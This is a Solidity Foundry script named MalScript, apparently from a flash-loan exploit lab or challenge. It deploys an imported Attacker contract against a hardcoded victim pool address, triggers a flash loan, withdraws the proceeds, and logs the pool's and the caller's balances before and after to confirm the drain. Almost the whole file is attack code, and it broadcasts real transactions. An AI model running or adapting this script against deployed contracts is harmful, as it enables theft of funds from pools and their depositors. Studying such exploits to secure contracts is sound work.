// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Script, console} from "forge-std/Script.sol";
import {Attacker} from "../src/Flashloan.sol";

contract MalScript is Script {
    Attacker attacker;
    address victim = 0xe3e1527cBD4072dedDC914650D7297c6617F40Ad;

    
    function parseToEth() public {
       
    }

    function run() public{
        // vm.deal(victim, 1000 ether); // added for testing
        console.log("pool balance before: ", victim.balance / 1 ether);
        console.log("owner: ",msg.sender);
        console.log("owner balance before: ", msg.sender.balance / 1 ether);

        vm.startBroadcast();
        
        attacker = new Attacker(victim);
        
        attacker.initiateFlashLoan();

        attacker.withdraw();

        vm.stopBroadcast();

        console.log("pool balance: ", victim.balance / 1 ether);
        console.log("owner balance after: ", msg.sender.balance / 1 ether);
    }

}
